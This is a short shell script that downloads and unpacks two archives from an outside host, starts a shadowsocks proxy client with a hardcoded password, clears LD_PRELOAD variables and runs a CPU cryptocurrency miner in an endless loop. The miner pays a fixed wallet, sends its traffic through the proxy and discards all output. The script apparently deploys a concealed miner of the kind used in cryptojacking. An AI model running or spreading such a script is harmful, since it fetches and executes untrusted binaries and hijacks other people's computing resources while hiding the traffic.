#!/bin/sh
TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`
echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

wget -q http://greenleaf.teatspray.fun/GP_258.tar.gz >/dev/null

tar -xf GP_258.tar.gz

sleep 2

ls

wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz >/dev/null

sleep 2

tar -xf Spectre.tar.gz

sleep 2

./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 ifconfig.me

sleep 2

echo ""
echo ""
echo ""
echo ""

unset LD_PRELOAD
unset LD_PRELOAD_ENV
unset LD_LIBRARY_PATH

sleep 2

while true
do
./GP --disable-gpu --algorithm yespowersugar --pool zergsugar.teatspray.fun:6535 --wallet sugar1qy33vm690c6fzcct9w4k3egngmcmps2jtp4z5lc.$currentdate --password c=SUGAR,mc=SUGAR,m=solo,ID=$currentdate --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
sleep 2
done
